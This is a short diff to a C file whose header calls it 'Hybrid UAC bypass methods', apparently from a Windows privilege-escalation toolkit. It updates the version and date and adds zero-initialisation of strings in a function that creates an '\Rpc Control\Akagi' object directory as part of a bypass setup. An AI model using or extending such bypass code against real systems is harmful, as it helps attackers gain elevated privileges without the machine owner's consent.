@@ -4,9 +4,9 @@
 *
 *  TITLE:       HYBRIDS.C
 *
-*  VERSION:     2.56
+*  VERSION:     2.57
 *
-*  DATE:        15 Feb 2017
+*  DATE:        01 Mar 2017
 *
 *  Hybrid UAC bypass methods.
 *
@@ -1197,12 +1197,18 @@ BOOL ucmSetupAkagiLink(
 
         lpUser = _filename(usKey.Buffer);
 
+        ParentRoot.Buffer = NULL;
+        ParentRoot.Length = 0;
+        ParentRoot.MaximumLength = 0;
         RtlInitUnicodeString(&ParentRoot, L"\\Rpc Control\\Akagi");
         InitializeObjectAttributes(&attr, &ParentRoot, OBJ_CASE_INSENSITIVE, 0, NULL);
         status = NtCreateDirectoryObject(&hRoot, DIRECTORY_CREATE_SUBDIRECTORY, &attr);
         if (!NT_SUCCESS(status))
             break;
 
+        ChildName.Buffer = NULL;
+        ChildName.Length = 0;
+        ChildName.MaximumLength = 0;
         RtlInitUnicodeString(&ChildName, lpUser);
         attr.RootDirectory = hRoot;
         attr.ObjectName = &ChildName;
